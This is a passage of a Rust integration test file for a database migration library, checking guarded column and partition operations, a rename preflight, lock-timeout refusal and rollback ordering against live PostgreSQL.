        journal_applied(&session, &cfg, &units[1].version).await,
        "the resume journaled the sibling unit as applied"
    );
    assert!(
        column_exists(&session, &cfg.project_schema, "accounts", "ssn_masked").await,
        "the resume journaled the sibling unit green, so `ssn_masked` must exist"
    );

    drop_schemas(&session, &cfg).await;
}

/// The CONTROL for the two arms above. The precondition - both columns already on the
/// server - is built by the UNGUARDED masked `addColumn`, which stamps no probe and so
/// runs both units bare. The guarded op is then authored as a second plan over that
/// catalog and must stay a clean no-op: every unit `SatisfiedNoop`s, nothing is
/// re-added or dropped, and both units journal green.
///
/// This passes before AND after the sibling-probe fix. Without it a red arm would only
/// prove that something about guarded masked addColumn is broken; with it, the red arms
/// are pinned to the SIBLING'S PROBE specifically - the idempotent re-run the guard
/// exists for still works, and the fix must not turn it into a duplicate-column error.
#[compio::test]
async fn a_guarded_masked_add_column_is_a_clean_noop_when_both_columns_are_present() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let base = mig(
        MigrationId::generate(),
        "base",
        &format!(
            "CREATE TABLE \"{}\".accounts (id bigint PRIMARY KEY)",
            cfg.project_schema
        ),
    );
    let unguarded = lower_masked_add_column(&cfg, "masked_add_unguarded", false);
    let mut plan = vec![base.clone()];
    plan.extend(unguarded.iter().cloned());
    apply(&session, &cfg, &plan, Approval::None, "app_test")
        .await
        .expect("the unguarded masked addColumn applies");
    assert!(
        column_exists(&session, &cfg.project_schema, "accounts", "ssn").await
            && column_exists(&session, &cfg.project_schema, "accounts", "ssn_masked").await,
        "the unguarded plan runs both units bare and creates both columns"
    );

    // The GUARDED op as a second plan: fresh versions, so both units are pending and
    // both reach the probe against a catalog that already satisfies them.
    let guarded = lower_masked_add_column(&cfg, "masked_add_guarded_noop", true);
    let mut replay = vec![base.clone()];
    replay.extend(guarded.iter().cloned());
    apply(&session, &cfg, &replay, Approval::None, "app_test")
        .await
        .expect("the guarded plan is a clean no-op, not a duplicate-column error");

    for unit in &guarded {
        assert!(
            journal_applied(&session, &cfg, &unit.version).await,
            "the satisfied no-op still journals `{}` net-applied",
            unit.name
        );
    }
    assert!(
        column_exists(&session, &cfg.project_schema, "accounts", "ssn").await
            && column_exists(&session, &cfg.project_schema, "accounts", "ssn_masked").await,
        "the no-op left both columns in place"
    );

    drop_schemas(&session, &cfg).await;
}

// ---------------------------------------------------------------------------
// Scenario 12 - a guarded `dropPartition` must still drop the child
// ---------------------------------------------------------------------------

/// The partitioned-parent setup an authored history establishes BEFORE the drop:
/// a `PARTITION BY RANGE (bucket)` parent, one range child, and one row that
/// routes into that child. Returned as ops so the same list can be folded into the
/// `LiveSchema` the LATER drop migration lowers against.
fn partition_setup_ops() -> Vec<zero_migrate::model::ir::Op> {
    let ir: MigrationIr = serde_json::from_str(
        r#"{"ir_version":1,"name":"partition_setup","ops":[
          {"op":"createTable","name":"events","columns":[
            {"name":"bucket","type":"int","nullable":false},
            {"name":"payload","type":"text","nullable":false}
          ],"partitionBy":{"kind":"range","columns":["bucket"],"collapse":true}},
          {"op":"createPartition","name":"events_0","of":"events",
           "bounds":{"kind":"range","from":[{"kind":"int","value":0}],
                     "to":[{"kind":"int","value":100}]}},
          {"op":"insert","table":"events","columns":["bucket","payload"],
           "rows":[[42,"kept"]]}
        ]}"#,
    )
    .expect("parse the partitioned-parent setup IR");
    ir.ops
}

/// Lower one authored partition IR through the shipped `IrAuthor` on PostgreSQL.
/// `live` is the folded projection of every EARLIER migration, exactly as a deploy
/// hands the lowerer the already-applied history.
fn lower_partition_plan(
    cfg: &ExecutorConfig,
    ir_name: &str,
    ops_json: &str,
    live: &LiveSchema,
) -> Vec<PlanStep> {
    let authored: MigrationIr = serde_json::from_str(&format!(
        r#"{{"ir_version":1,"name":"{ir_name}","ops":{ops_json}}}"#
    ))
    .expect("parse the partition IR");
    let resolved =
        resolve_create_table_policy(&authored, &support::no_inject("app"), &cfg.project_schema)
            .expect("resolve the no-inject table policy");
    IrAuthor::new(
        &cfg.project_schema,
        "app_test",
        SqlDialect::Postgres,
        &support::no_inject("app"),
    )
    .lower_steps(&resolved, live)
    .expect("the partition IR lowers on PostgreSQL")
}

/// The `LiveSchema` a migration authored AFTER `partition_setup_ops` lowers
/// against: the static projection of the setup ops, carrying both the parent table
/// and the `events_0` child bound.
fn partition_live_after_setup(cfg: &ExecutorConfig) -> LiveSchema {
    let snap = zero_migrate::fold_ops(
        &partition_setup_ops(),
        SqlDialect::Postgres,
        &cfg.project_schema,
        &support::no_inject("app"),
    )
    .expect("fold the partition setup ops");
    let mut live = LiveSchema::from_tables(snap.tables.keys().cloned().collect());
    live.table_snapshots = snap.tables;
    live.partitions = snap.partitions;
    live
}

/// Every relation the live catalog reports in the project schema, child partitions
/// included (`relispartition` is NOT filtered - the point is to see the child).
async fn project_relations(session: &PgDevSession, schema: &str) -> Vec<String> {
    use zero_migrate::driver::SqlSession;
    session
        .query(
            "SELECT c.relname AS name FROM pg_class c \
             JOIN pg_namespace n ON n.oid = c.relnamespace \
             WHERE n.nspname = $1 AND c.relkind IN ('r', 'p') ORDER BY c.relname",
            &[schema.into()],
        )
        .await
        .expect("read the live relation list")
        .iter()
        .map(|r| r.try_get::<_, String>("name").expect("decode relname"))
        .collect()
}

/// The `bucket` values still readable through the partitioned parent.
async fn event_buckets(session: &PgDevSession, schema: &str) -> Vec<i32> {
    use zero_migrate::driver::SqlSession;
    session
        .query(
            &format!("SELECT bucket FROM \"{schema}\".events ORDER BY bucket"),
            &[],
        )
        .await
        .expect("read the surviving event rows")
        .iter()
        .map(|r| r.try_get::<_, i32>("bucket").expect("decode bucket"))
        .collect()
}

/// The DDL versions in a lowered plan, in plan order.
fn ddl_versions(steps: &[PlanStep]) -> Vec<MigrationId> {
    steps
        .iter()
        .filter_map(|step| match step {
            PlanStep::Ddl(m) => Some(m.version.clone()),
            _ => None,
        })
        .collect()
}

/// Apply the partitioned-parent setup, then a later `dropPartition` migration -
/// with or without the authored `ifExists` guard - and report what the SERVER holds
/// afterwards: the relation list, the surviving rows, and whether the drop's own
/// version is net-applied in the journal.
async fn drop_partition_outcome(
    session: &PgDevSession,
    cfg: &ExecutorConfig,
    guarded: bool,
) -> (Vec<String>, Vec<i32>, bool) {
    let backend = PostgresBackend::new_generic(session);
    backend.ensure_journal(cfg).await.expect("ensure journal");

    let setup_ops = serde_json::to_string(&partition_setup_ops()).expect("serialize setup ops");
    let setup = lower_partition_plan(cfg, "partition_setup", &setup_ops, &LiveSchema::default());
    MigrationEngine::new()
        .apply_plan(
            &setup,
            Approval::Approved,
            &backend,
            cfg,
            "partition-drop-setup",
            LockMode::Acquire,
        )
        .await
        .expect("the partitioned parent, its child, and the row apply");

    let guard = if guarded {
        r#","existenceGuard":"ifExists""#
    } else {
        ""
    };
    let drop_ops =
        format!(r#"[{{"op":"dropPartition","parent":"events","name":"events_0"{guard}}}]"#);
    let name = if guarded {
        "partition_drop_guarded"
    } else {
        "partition_drop_unguarded"
    };
    let drop_plan = lower_partition_plan(cfg, name, &drop_ops, &partition_live_after_setup(cfg));
    MigrationEngine::new()
        .apply_plan(
            &drop_plan,
            Approval::Approved,
            &backend,
            cfg,
            "partition-drop",
            LockMode::Acquire,
        )
        .await
        .expect("the dropPartition migration applies");

    let versions = ddl_versions(&drop_plan);
    assert_eq!(versions.len(), 1, "dropPartition lowers to one DDL unit");
    let journaled = journal_applied(session, cfg, &versions[0]).await;
    (
        project_relations(session, &cfg.project_schema).await,
        event_buckets(session, &cfg.project_schema).await,
        journaled,
    )
}

/// A `dropPartition({ ifExists: true })` must DROP the child partition and take its
/// rows with it, exactly like the unguarded drop. The guard weakens the drop's
/// precondition; it must never CANCEL the drop.
///
/// The failure this pins is a silent skip under a green journal: the child of a
/// partitioned parent never enters `SchemaSnapshot::tables` (the snapshot query
/// filters `relispartition = false`), the guard probe resolves the child as a
/// TABLE, reads it absent, returns `SatisfiedNoop`, skips the `DROP TABLE` - and
/// still journals the migration completed. Apply reports success and the partition
/// AND ITS ROWS survive.
///
/// Asserts the PAIR from the server, because neither half alone is the defect: a
/// surviving partition under a green journal is the bug; a surviving partition with
/// the migration still pending would merely be a failed deploy.
///
/// Does NOT cover MySQL or SQLite, where nothing needs covering: both collapse
/// `dropPartition` to a bounded DELETE, a different path with no catalog probe, so
/// the partition-resolved-as-a-table failure this arm pins cannot occur there.
///
/// Does NOT cover `detachPartition`, which carries no existence guard, so there is
/// no guard verdict for any layer to get wrong.
#[compio::test]
async fn a_guarded_drop_partition_drops_the_child_and_its_rows() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let (relations, buckets, journaled) = drop_partition_outcome(&session, &cfg, true).await;

    // One assertion over the whole server-observed triple: a surviving child and a
    // green journal are the PAIR, and reporting only the first divergence would hide
    // whichever half a future regression breaks second.
    assert_eq!(
        (relations.as_slice(), buckets.as_slice(), journaled),
        (["events".to_string()].as_slice(), [].as_slice(), true),
        "guarded dropPartition: catalog {relations:?} rows {buckets:?} journal applied {journaled}"
    );

    drop_schemas(&session, &cfg).await;
}

/// The control: the SAME authored history with the `ifExists` guard removed. It
/// differs from the guarded case in exactly one flag, so a divergence between the
/// two isolates the guard as the cause.
#[compio::test]
async fn an_unguarded_drop_partition_drops_the_child_and_its_rows() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let (relations, buckets, journaled) = drop_partition_outcome(&session, &cfg, false).await;

    assert_eq!(
        (relations.as_slice(), buckets.as_slice(), journaled),
        (["events".to_string()].as_slice(), [].as_slice(), true),
        "unguarded dropPartition: catalog {relations:?} rows {buckets:?} journal applied {journaled}"
    );

    drop_schemas(&session, &cfg).await;
}

/// Apply the partitioned-parent setup, then a SECOND plan whose ops are `ops_json`,
/// lowered against the projection that PRECEDES it (`LiveSchema::default()`) - the
/// input a deploy hands the lowerer when it replays authored history from the start.
/// Returns the apply outcome so a caller can assert either success or the refusal.
async fn apply_second_partition_plan(
    session: &PgDevSession,
    cfg: &ExecutorConfig,
    ir_name: &str,
    ops_json: &str,
    live: &LiveSchema,
) -> Result<(), DeclarativeApplyError> {
    let backend = PostgresBackend::new_generic(session);
    backend.ensure_journal(cfg).await.expect("ensure journal");
    let setup_ops = serde_json::to_string(&partition_setup_ops()).expect("serialize setup ops");
    let setup = lower_partition_plan(cfg, "partition_setup", &setup_ops, &LiveSchema::default());
    MigrationEngine::new()
        .apply_plan(
            &setup,
            Approval::Approved,
            &backend,
            cfg,
            "partition-setup",
            LockMode::Acquire,
        )
        .await
        .expect("the partitioned parent, its child, and the row apply");

    let steps = lower_partition_plan(cfg, ir_name, ops_json, live);
    MigrationEngine::new()
        .apply_plan(
            &steps,
            Approval::Approved,
            &backend,
            cfg,
            "partition-second-plan",
            LockMode::Acquire,
        )
        .await
        .map(|_| ())
}

/// The CREATE direction: replaying an authored history that ALREADY ran must be a
/// clean no-op when every op carries `ifNotExists`, not a hard PostgreSQL error.
///
/// The failure this pins is the same partition/table confusion as the drop, seen
/// from the other side: `createPartition ifNotExists` stamped a TABLE probe on the
/// child, the child is never in the snapshot's table map, so the probe read it
/// ABSENT and returned `RunBare` - and the bare `CREATE TABLE ... PARTITION OF`
/// raised `relation "events_0" already exists` (SQLSTATE 42P07) against a catalog
/// the guard was supposed to have recognized. The guarded `createTable` on the
/// PARENT already no-opped correctly, which is what made the child's failure the
/// isolated variable.
///
/// This is NOT the same defect as the drop and is not a data-safety bug - the
/// replay fails loudly rather than silently. It is the create-direction half of the
/// same missing shape.
///
/// Does NOT assert the probe returned `SatisfiedNoop` rather than having somehow
/// re-created the child; the catalog assertion covers the observable outcome only.
#[compio::test]
async fn a_guarded_create_partition_replay_is_a_clean_noop() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let replay = r#"[
      {"op":"createTable","name":"events","columns":[
        {"name":"bucket","type":"int","nullable":false},
        {"name":"payload","type":"text","nullable":false}
      ],"partitionBy":{"kind":"range","columns":["bucket"],"collapse":true},
       "existenceGuard":"ifNotExists"},
      {"op":"createPartition","name":"events_0","of":"events",
       "bounds":{"kind":"range","from":[{"kind":"int","value":0}],
                 "to":[{"kind":"int","value":100}]},
       "existenceGuard":"ifNotExists"}]"#;
    let outcome = apply_second_partition_plan(
        &session,
        &cfg,
        "partition_create_replay",
        replay,
        &LiveSchema::default(),
    )
    .await;

    assert!(
        outcome.is_ok(),
        "replaying a fully guarded createTable + createPartition must no-op, got {outcome:?}"
    );
    assert_eq!(
        project_relations(&session, &cfg.project_schema).await,
        vec!["events".to_string(), "events_0".to_string()],
        "the guarded replay leaves the parent and its child exactly as they were"
    );
    assert_eq!(
        event_buckets(&session, &cfg.project_schema).await,
        vec![42],
        "the guarded replay does not disturb the child's rows"
    );

    drop_schemas(&session, &cfg).await;
}

/// The fail-closed half of the partition probe: a same-NAME child whose SHAPE
/// diverges from the declared one is refused, never matched by name.
///
/// Three divergences, each asserted to roll back with the child intact:
///   - a `dropPartition` naming a parent the live child does not belong to
///     (`of`) - the authored op describes a different object than the one on disk;
///   - a `createPartition ifNotExists` whose declared bounds differ from the live
///     child's (`bounds`) - a no-op here would journal green over a partition that
///     routes different rows than the migration says;
///   - a `dropPartition` naming a plain TABLE (`kind`) - the guard must never
///     resolve a partition op onto a standalone table.
///
/// Does NOT cover a `dropPartition` whose bounds diverge: the drop leg compares
/// ownership only, deliberately, because a re-bounded child is still the child the
/// author means to remove.
#[compio::test]
async fn a_guarded_partition_probe_fails_closed_on_a_divergent_child() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);

    let cases: [(&str, &str, &str, &str); 3] = [
        (
            "wrong_parent",
            r#"[{"op":"createTable","name":"other","columns":[
                 {"name":"bucket","type":"int","nullable":false}
               ],"partitionBy":{"kind":"range","columns":["bucket"],"collapse":true}},
               {"op":"dropPartition","parent":"other","name":"events_0",
                "existenceGuard":"ifExists"}]"#,
            "partition events_0",
            "of",
        ),
        (
            "wrong_bounds",
            r#"[{"op":"createPartition","name":"events_0","of":"events",
                 "bounds":{"kind":"range","from":[{"kind":"int","value":0}],
                           "to":[{"kind":"int","value":200}]},
                 "existenceGuard":"ifNotExists"}]"#,
            "partition events_0",
            "bounds",
        ),
        (
            "plain_table",
            r#"[{"op":"createTable","name":"audit","columns":[
                 {"name":"bucket","type":"int","nullable":false}
               ]},
               {"op":"dropPartition","parent":"events","name":"audit",
                "existenceGuard":"ifExists"}]"#,
            "partition audit",
            "kind",
        ),
    ];

    for (label, ops, want_object, want_field) in cases {
        let tok = token();
        let cfg = cfg_for(&tok);
        drop_schemas(&session, &cfg).await;
        ensure_project_schema(&session, &cfg).await;

        let outcome = apply_second_partition_plan(
            &session,
            &cfg,
            &format!("partition_drift_{label}"),
            ops,
            &LiveSchema::default(),
        )
        .await;

        match outcome {
            Err(DeclarativeApplyError::Plain(EngineError::Apply(
                ApplyError::ExistenceGuardDrift { object, field, .. },
            ))) => {
                assert_eq!(
                    (object.as_str(), field.as_str()),
                    (want_object, want_field),
                    "{label}: wrong divergence reported"
                );
            }
            other => panic!("{label}: expected ExistenceGuardDrift, got {other:?}"),
        }
        assert!(
            project_relations(&session, &cfg.project_schema)
                .await
                .contains(&"events_0".to_string()),
            "{label}: a refused guard rolls back with the child still in place"
        );

        drop_schemas(&session, &cfg).await;
    }
}

// A PostgreSQL rename whose OLD column is read by a generated column is refused
// BEFORE the expand-contract chain starts, rather than failing at its last step.
//
// The chain is five separate journaled migrations - E1 add column, E2 dual-write
// trigger, E3 backfill, C1 drop trigger, C2 drop the old column. The dependency
// only stops C2, so without a preflight the first four commit and the operator is
// left mid-transition: both columns present, the trigger gone, the rename
// unfinished, and the repair manual.
//
// MEASURED on PostgreSQL 18.4, the failure this prevents:
//
//     ERROR:  cannot drop column qty of table t because other objects depend on it
//     DETAIL:  column total of table t depends on column qty of table t
//
// CASCADE is not the answer and is not what this asserts: `DROP COLUMN qty
// CASCADE` reports `drop cascades to column total` and removes a column nobody
// named, inside a step whose destructive flag was granted for one specific
// column. See docs/review-log.md F167.
//
// The assertion that matters is the SECOND one. "An error came back" is also true
// of today's mid-chain failure; only "the new column was never added" separates a
// preflight refusal from a C2 blow-up.
#[compio::test]
async fn a_pg_rename_read_by_a_generated_column_is_refused_before_the_chain_starts() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;
    session
        .batch(&format!(
            "CREATE TABLE \"{}\".dep_rename_items (\
                 id bigint PRIMARY KEY, qty int NOT NULL, unit int NOT NULL, \
                 total int GENERATED ALWAYS AS (qty * unit) STORED\
             )",
            cfg.project_schema
        ))
        .await
        .expect("create a table whose generated column reads the rename source");

    let backend = PostgresBackend::new_generic(&session);
    let engine = MigrationEngine::new();
    let rename = ExpandContractAuthor::new(cfg.project_schema.clone(), "app_test")
        .author(&OnlineIntent::RenameColumn {
            table: "dep_rename_items".into(),
            from: "qty".into(),
            to: "quantity".into(),
            ty: "int".into(),
        })
        .expect("author the rename");
    let step = PlanStep::OnlineRename(RenameStep::PgExpandContract(rename));

    let outcome = engine
        .apply_plan_with_touched_and_depends(
            std::slice::from_ref(&step),
            &["dep_rename_items".into()],
            &[],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
            LockMode::Acquire,
        )
        .await;

    let error = outcome.expect_err("a rename PostgreSQL cannot finish must be refused");
    let message = error.to_string();
    assert!(
        message.contains("qty") && message.contains("total"),
        "the refusal names the column being renamed and the dependent that blocks it: {message}"
    );

    // Nothing ran. This is the whole point: today's failure leaves `quantity`
    // added and the dual-write trigger dropped.
    let added = session
        .query(
            "SELECT 1 FROM information_schema.columns \
              WHERE table_schema = $1 AND table_name = 'dep_rename_items' \
                AND column_name = 'quantity'",
            &[cfg.project_schema.clone().into()],
        )
        .await
        .expect("read back the table shape");
    assert!(
        added.is_empty(),
        "the refusal happened before E1, so the new column was never added"
    );

    drop_schemas(&session, &cfg).await;
}

/// A plan whose LATER migration carries a zero lock-timeout budget applies
/// nothing, rather than committing everything ahead of it and then refusing.
///
/// The coalescing loop runs each maximal run of consecutive DDL steps as its own
/// `apply_with_lock_backend` call, and the executor inside that call applies one
/// migration at a time. A budget that resolves to zero is discovered when the
/// session preamble renders, which is after every earlier step has committed. The
/// database is then half-migrated for a reason that was knowable before anything
/// ran, since a budget is a property of the plan and never of live state.
///
/// The plan is built by hand rather than authored, because the lowering gate
/// refuses a per-migration timeout override on any plan carrying a non-DDL step -
/// any value, not only zero. Reaching this state requires an embedder holding
/// `Migration` and `PlanStep` directly, which is the population the refusal in
/// `apply::timeout` exists for.
///
/// The assertion that carries the test is the second one: the error alone proves
/// nothing, because the unfixed path also errors. What separates them is whether
/// the first migration's table survives the refusal.
#[compio::test]
async fn a_plan_with_a_late_zero_budget_applies_none_of_its_earlier_steps() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let backend = PostgresBackend::new_generic(&session);
    backend.ensure_journal(&cfg).await.expect("ensure journal");

    // The backfill target has to exist before the plan runs: the middle step is
    // what forces the two DDL runs apart, and it needs a real table to walk.
    session
        .batch(&format!(
            "CREATE TABLE \"{schema}\".late_zero_seed (\
                id bigint PRIMARY KEY, value text NOT NULL\
            ); \
             INSERT INTO \"{schema}\".late_zero_seed (id, value) VALUES (1, 'seed')",
            schema = cfg.project_schema
        ))
        .await
        .expect("create the backfill target");

    let first = mig(
        MigrationId::generate(),
        "create the run A marker",
        &format!(
            "CREATE TABLE \"{}\".late_zero_run_a (id bigint PRIMARY KEY)",
            cfg.project_schema
        ),
    );

    let backfill_version = MigrationId::generate();
    let backfill_checksum = step_checksum("late zero backfill");
    let backfill = BackfillSpec {
        schema: cfg.project_schema.clone(),
        table: "late_zero_seed".into(),
        cursor_columns: vec!["id".into()],
        cursor_stability: zero_migrate::CursorStability::GuardUpdates,
        cursor_contract: None,
        batch_size: 10,
        set_clause: r#""value" = 'walked'"#.into(),
        per_row: BTreeMap::new(),
        filter: None,
        name: "walk the seed".into(),
    };

    // The zero lives on the LAST step, so every earlier step is legitimate and
    // would apply cleanly on its own.
    let last_up = format!(
        "CREATE TABLE \"{}\".late_zero_run_b (id bigint PRIMARY KEY)",
        cfg.project_schema
    );
    let mut last = mig(MigrationId::generate(), "create the run B marker", &last_up);
    last.flags.lock_timeout_ms = Some(0);
    last.checksum = Checksum::of(&zero_migrate::ChecksumInput {
        up: &last_up,
        down: None,
        flags: &last.flags,
        owner_app: "app_test",
        depends_on: &[],
        supersedes: &[],
        preconditions: &[],
    });

    let steps = vec![
        PlanStep::Ddl(first.clone()),
        PlanStep::Backfill {
            version: backfill_version,
            checksum: backfill_checksum,
            spec: backfill,
        },
        PlanStep::Ddl(last),
    ];

    let error = MigrationEngine::new()
        .apply_plan(
            &steps,
            Approval::Approved,
            &backend,
            &cfg,
            "tester",
            LockMode::Acquire,
        )
        .await
        .expect_err("a plan carrying a zero lock-timeout budget must be refused");
    let rendered = error.to_string();
    assert!(
        rendered.contains("lock_timeout = 0"),
        "the refusal must name the indefinite budget: {rendered}"
    );

    assert!(
        !table_exists(&session, &cfg.project_schema, "late_zero_run_a").await,
        "the refusal must land before the first migration commits, and did not"
    );
    assert!(
        !table_exists(&session, &cfg.project_schema, "late_zero_run_b").await,
        "the migration carrying the zero budget must not have run"
    );
    let walked: String = session
        .query_one(
            &format!(
                "SELECT value FROM \"{}\".late_zero_seed WHERE id = 1",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect("read the backfill target")
        .try_get("value")
        .expect("decode the backfill target");
    assert_eq!(
        walked, "seed",
        "the intervening backfill must not have run either"
    );

    drop_schemas(&session, &cfg).await;
}

// ---------------------------------------------------------------------------
// The rollback ORCHESTRATOR against live PostgreSQL. The SQLite proof shows the
// ordering; this shows the same code path drives a second dialect, which was an
// argument from the `MigrationBackend` seam until it was measured here.
// ---------------------------------------------------------------------------
#[compio::test]
async fn rollback_unwinds_both_migrations_in_reverse_order_on_live_postgres() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let backend = PostgresBackend::new_generic(&session);
    backend.ensure_journal(&cfg).await.expect("ensure journal");

    let schema = cfg.project_schema.clone();
    let parent = mig_with_down(
        MigrationId::generate(),
        "create_parent",
        &format!("CREATE TABLE {schema}.parent (id int primary key)"),
        &format!("DROP TABLE {schema}.parent"),
    );
    let mut child = mig_with_down(
        MigrationId::generate(),
        "create_child",
        &format!("CREATE TABLE {schema}.child (id int primary key)"),
        &format!("DROP TABLE {schema}.child"),
    );
    child.depends_on = vec![parent.version.clone()];

    backend
        .apply_one(&cfg, &parent, "tester", false, &[], "apply")
        .await
        .expect("apply parent");
    backend
        .apply_one(&cfg, &child, "tester", false, &[], "apply")
        .await
        .expect("apply child");
    assert!(table_exists(&session, &schema, "parent").await);
    assert!(table_exists(&session, &schema, "child").await);

    let set = vec![parent.clone(), child.clone()];
    let guard_cfg = GuardConfig::from_policy(support::no_inject(&schema), SqlDialect::Postgres);
    let guard = zero_migrate::guard_for(&guard_cfg);
    let outcome = zero_migrate::rollback(
        &backend,
        &cfg,
        &zero_migrate::RollbackRequest::new(zero_migrate::RollbackTarget::All),
        &set,
        zero_migrate::Approval::Approved,
        "operator",
        &*guard,
    )
    .await
    .expect("orchestrated rollback on live postgres");

    assert_eq!(
        outcome.rolled_back,
        vec![
            child.version.as_str().to_string(),
            parent.version.as_str().to_string()
        ],
        "child rolls back before the parent it depends on"
    );
    assert!(
        !table_exists(&session, &schema, "child").await,
        "child gone"
    );
    assert!(
        !table_exists(&session, &schema, "parent").await,
        "parent gone"
    );

    drop_schemas(&session, &cfg).await;
}
